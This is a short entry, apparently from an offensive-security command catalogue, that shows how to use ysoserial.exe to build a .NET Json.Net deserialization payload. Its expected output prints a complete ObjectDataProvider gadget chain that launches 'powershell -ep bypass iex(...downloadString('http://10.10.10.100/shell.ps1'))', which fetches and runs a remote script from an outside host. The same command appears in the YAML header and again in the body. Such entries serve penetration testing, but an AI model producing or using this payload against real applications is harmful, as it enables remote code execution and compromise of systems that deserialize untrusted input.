---
id: f6a8fff3-7ed3-4bb8-8cc7-a0461130d796
name: YSoSerial Generate a .NET Deserialization Payload
type: command
executor: command_prompt
data: 'ysoserial.exe -f $_FORMAT -o raw -c "$_COMMAND" '
output: "PS C:\\Users\\Bob\\Desktop\\ysoserial.net\\ysoserial\\bin\\Release > .\\\
  ysoserial.exe -f Json.Net -g ObjectDataProvider -o raw -c \"powershell -ep bypass\
  \ iex(New-Object Net.WebClient).downloadString('http://10.10.10.100/shell.ps1')\"\
  \n{\n    '$type':'System.Windows.Data.ObjectDataProvider, PresentationFramework,\
  \ Version=4.0.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35',\n    'MethodName':'Start',\n\
  \    'MethodParameters':{\n        '$type':'System.Collections.ArrayList, mscorlib,\
  \ Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089',\n        '$values':['cmd',\
  \ '/c powershell -ep bypass iex(New-Object Net.WebClient).downloadString('http://10.10.10.100/shell.ps1')']\n\
  \    },\n    'ObjectInstance':{'$type':'System.Diagnostics.Process, System, Version=4.0.0.0,\
  \ Culture=neutral, PublicKeyToken=b77a5c561934e089'}\n}"
created_at: '2020-03-23T21:07:08.578682+00:00'
updated_at: '2023-05-29T16:48:52.884824+00:00'
---

# YSoSerial Generate a .NET Deserialization Payload

```command_prompt
ysoserial.exe -f $_FORMAT -o raw -c "$_COMMAND" 
```

## Expected Output

```
PS C:\Users\Bob\Desktop\ysoserial.net\ysoserial\bin\Release > .\ysoserial.exe -f Json.Net -g ObjectDataProvider -o raw -c "powershell -ep bypass iex(New-Object Net.WebClient).downloadString('http://10.10.10.100/shell.ps1')"
{
    '$type':'System.Windows.Data.ObjectDataProvider, PresentationFramework, Version=4.0.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35',
    'MethodName':'Start',
    'MethodParameters':{
        '$type':'System.Collections.ArrayList, mscorlib, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089',
        '$values':['cmd', '/c powershell -ep bypass iex(New-Object Net.WebClient).downloadString('http://10.10.10.100/shell.ps1')']
    },
    'ObjectInstance':{'$type':'System.Diagnostics.Process, System, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089'}
}
```


